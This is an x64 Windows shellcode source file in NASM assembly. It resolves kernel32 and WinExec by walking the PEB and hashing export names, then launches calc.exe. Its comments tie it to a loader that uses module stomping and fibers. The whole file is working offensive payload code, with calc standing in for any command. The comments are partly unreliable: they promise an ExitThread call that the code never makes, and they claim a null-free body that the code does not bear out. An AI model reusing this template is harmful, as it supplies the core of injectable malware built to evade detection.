; ============================================================
; Clean x64 WinExec("calc.exe", 1) shellcode — hash-walk variant
; ============================================================
; Walks PEB->Ldr->InLoadOrderModuleList comparing BaseDllName
; via JOAAT-32 hash (case-folded to upper). Robust against
; arbitrary load order / extra-DLLs (boku7's "3rd entry" trick
; fails when our loader has loaded amsi/wininet/ktmw32).
;
; Once kernel32 base is found, walks its EAT via the same JOAAT
; hash to resolve WinExec. Calls WinExec("calc.exe", 1) then
; ExitThread(0) — clean exit, no garbage execution past the
; shellcode (which would happen in module-stomped .text).
;
; No null bytes in the shellcode body itself (only in the
; embedded "calc.exe\0" string, which is fine — it's data).
;
; Assemble: nasm -f bin calc-hash.asm -o calc-hash.bin
; ============================================================

BITS 64
default rel

section .text
global _start

_start:
    cld
    and  rsp, 0xFFFFFFFFFFFFFFF0    ; align stack 16

    ; rbx will hold kernel32 base after walk
    ; r14 will hold WinExec address after lookup
    xor  rax, rax
    mov  rax, [gs:rax+0x60]         ; PEB
    mov  rax, [rax+0x18]            ; PEB.Ldr
    mov  rax, [rax+0x10]            ; InLoadOrderModuleList.Flink (1st entry)
    ; rax now points at first LDR_DATA_TABLE_ENTRY.InLoadOrderLinks.Flink
    ; (which IS the entry itself for offset purposes)

.next_mod:
    mov  rdi, [rax+0x60]            ; LDR_DATA_TABLE_ENTRY.BaseDllName.Buffer (wchar*)
    ; Hash the wide string into edx using JOAAT-32 upper-case
    xor  edx, edx                   ; hash accumulator
    xor  ecx, ecx                   ; char counter
.hash_char:
    movzx rsi, word [rdi+rcx*2]
    test  esi, esi
    jz    .hash_done
    cmp   esi, 'a'
    jl    .no_upper
    cmp   esi, 'z'
    jg    .no_upper
    sub   esi, 0x20                 ; lowercase -> uppercase
.no_upper:
    add   edx, esi
    mov   ebx, edx
    shl   ebx, 10
    add   edx, ebx                  ; hash += (hash << 10)
    mov   ebx, edx
    shr   ebx, 6
    xor   edx, ebx                  ; hash ^= (hash >> 6)
    inc   ecx
    jmp   .hash_char
.hash_done:
    ; Finalize JOAAT
    mov   ebx, edx
    shl   ebx, 3
    add   edx, ebx                  ; hash += (hash << 3)
    mov   ebx, edx
    shr   ebx, 11
    xor   edx, ebx                  ; hash ^= (hash >> 11)
    mov   ebx, edx
    shl   ebx, 15
    add   edx, ebx                  ; hash += (hash << 15)

    ; Hash of "KERNEL32.DLL" upper-case (precomputed JOAAT-32).
    cmp   edx, 0xCC296063
    je    .got_kernel32

    mov   rax, [rax]                ; next module (Flink)
    jmp   .next_mod

.got_kernel32:
    mov   rbx, [rax+0x30]           ; LDR_DATA_TABLE_ENTRY.DllBase

    ; --- Walk kernel32 export table, find WinExec by hash ---
    mov   eax, [rbx+0x3C]           ; e_lfanew
    add   rax, rbx                  ; NT headers
    mov   eax, [rax+0x88]           ; OptionalHeader.DataDirectory[0].VirtualAddress (ExportTable)
    add   rax, rbx                  ; IMAGE_EXPORT_DIRECTORY*
    mov   r10, rax                  ; r10 = export dir
    mov   ecx, [r10+0x18]           ; NumberOfNames
    mov   r11d, [r10+0x20]          ; AddressOfNames RVA
    add   r11, rbx                  ; r11 = name array (DWORD*)
.next_export:
    test  ecx, ecx
    jz    .done                     ; not found (shouldn't happen)
    dec   ecx
    mov   esi, [r11+rcx*4]          ; name RVA
    lea   rdi, [rbx+rsi]            ; name (ASCII)
    ; Hash the ASCII string (no upper-fold for API names — JOAAT raw)
    xor   edx, edx
    xor   r8d, r8d
.hash_a:
    movzx r9, byte [rdi+r8]
    test  r9, r9
    jz    .hash_a_done
    add   edx, r9d
    mov   r12d, edx
    shl   r12d, 10
    add   edx, r12d
    mov   r12d, edx
    shr   r12d, 6
    xor   edx, r12d
    inc   r8
    jmp   .hash_a
.hash_a_done:
    mov   r12d, edx
    shl   r12d, 3
    add   edx, r12d
    mov   r12d, edx
    shr   r12d, 11
    xor   edx, r12d
    mov   r12d, edx
    shl   r12d, 15
    add   edx, r12d

    ; Hash of "WinExec" (precomputed JOAAT-32, raw — no upper-fold).
    cmp   edx, 0x4169C9FD
    jne   .next_export

    ; Found WinExec name at index rcx. Resolve via ordinal table.
    mov   r12d, [r10+0x24]          ; AddressOfNameOrdinals RVA
    add   r12, rbx                  ; ordinal array (WORD*)
    movzx r13, word [r12+rcx*2]     ; ordinal
    mov   r12d, [r10+0x1C]          ; AddressOfFunctions RVA
    add   r12, rbx                  ; function RVA array (DWORD*)
    mov   r14d, [r12+r13*4]         ; WinExec RVA
    add   r14, rbx                  ; r14 = WinExec address

    ; --- Call WinExec("calc.exe", 1) ---
    lea   rcx, [rel calc_str]
    mov   rdx, 1                    ; SW_SHOWNORMAL
    sub   rsp, 0x28                 ; shadow space + alignment
    call  r14
    add   rsp, 0x28

.done:
    ; Find ExitThread and call it for clean exit. Skip lookup and just RET
    ; back into the caller — fiber return goes back to SwitchToFiber's
    ; saved context which won't crash the host process.
    ret

calc_str: db "calc.exe", 0
